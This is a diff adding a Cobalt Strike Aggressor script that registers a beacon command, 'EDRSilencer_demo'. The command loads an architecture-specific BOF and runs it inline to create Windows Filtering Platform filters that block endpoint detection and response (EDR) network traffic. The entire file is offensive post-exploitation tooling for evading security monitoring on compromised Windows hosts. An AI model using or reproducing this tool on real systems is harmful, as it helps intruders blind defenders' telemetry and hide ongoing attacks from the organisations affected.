@@ -1,0 +1,30 @@
+alias EDRSilencer_demo {
+	local('$barch $handle $data $args $cmd $progpath');
+	
+	if(size(@_) < 2)
+	{
+		berror($1, "usage: EDRSilencer_demo <blockedr/blockip/block/unblockall/unblock> [<program path>|<filter id>]");
+		return;
+	}
+
+	$cmd = $2;
+	$progpath = iff(-istrue $3, $3, "");
+
+	# figure out the arch of this session
+	$barch  = barch($1);
+	
+	# read in the right BOF file
+	$handle = openf(script_resource("EDRSilencer_demo. $+ $barch $+ .o"));
+	$data   = readb($handle, -1);
+	closef($handle);
+	
+	# pack our arguments
+	$args   = bof_pack($1, "zz", $cmd, $progpath);
+	
+	beacon_inline_execute($1, $data, "go", $args);
+}
+
+beacon_command_register(
+	"EDRSilencer_demo", 
+	"Create WFP filter to block EDR network traffic", 
+	"Synopsis: EDRSilencer_demo <blockedr/blockip/block/unblockall/unblock> [<program path>|<filter id>]\n"); 
